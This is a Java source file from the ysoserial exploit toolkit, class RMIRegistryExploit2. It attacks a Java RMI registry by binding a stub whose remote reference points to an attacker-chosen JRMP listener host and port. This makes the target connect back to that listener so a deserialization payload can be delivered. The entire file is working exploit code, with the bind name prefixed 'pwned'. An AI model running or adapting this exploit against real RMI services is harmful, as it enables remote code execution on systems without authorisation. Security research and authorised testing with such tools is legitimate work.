package ysoserial.exploit;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.rmi.ConnectIOException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.util.Random;

import static ysoserial.exploit.RMIRegistryExploit.RMISSLClientSocketFactory;

/**
 * @author wh1t3P1g
 * @since 2020/1/9
 */
public class RMIRegistryExploit2 {

    public static void main(final String[] args) throws Exception {
        if ( args.length < 4 ) {
            System.err.println(RMIRegistryExploit2.class.getName() + " <RMIRegistryHost>  <RMIRegistryPort> <JRMPListenerHost> <JRMPListenerPort>");
            System.exit(-1);
            return;
        }
        final String rmiRegistryHost = args[0];
        final int rmiRegistryPort = Integer.parseInt(args[1]);
        final String jrmpHost = args[2];
        final int jrmpPort = Integer.parseInt(args[3]);
        Registry registry = LocateRegistry.getRegistry(rmiRegistryHost, rmiRegistryPort);

        // test RMI registry connection and upgrade to SSL connection on fail
        try {
            registry.list();
        } catch (ConnectIOException ex) {
            registry = LocateRegistry.getRegistry(rmiRegistryHost, rmiRegistryPort, new RMISSLClientSocketFactory());
        }

        // ensure payload doesn't detonate during construction or deserialization
        exploit(registry, jrmpHost, jrmpPort);
    }

    public static void exploit(final Registry registry, final String host, final int port) throws Exception {

        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RMIConnectionImpl_Stub remote = new RMIConnectionImpl_Stub(ref);
        // also OK
        // RMIServerImpl_Stub OK
        // RegistryImpl_Stub OK
        // DGCImpl_Stub OK
        // ReferenceWrapper_Stub

        String name = "pwned" + System.nanoTime();
        try {
            registry.bind(name, remote);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }
}
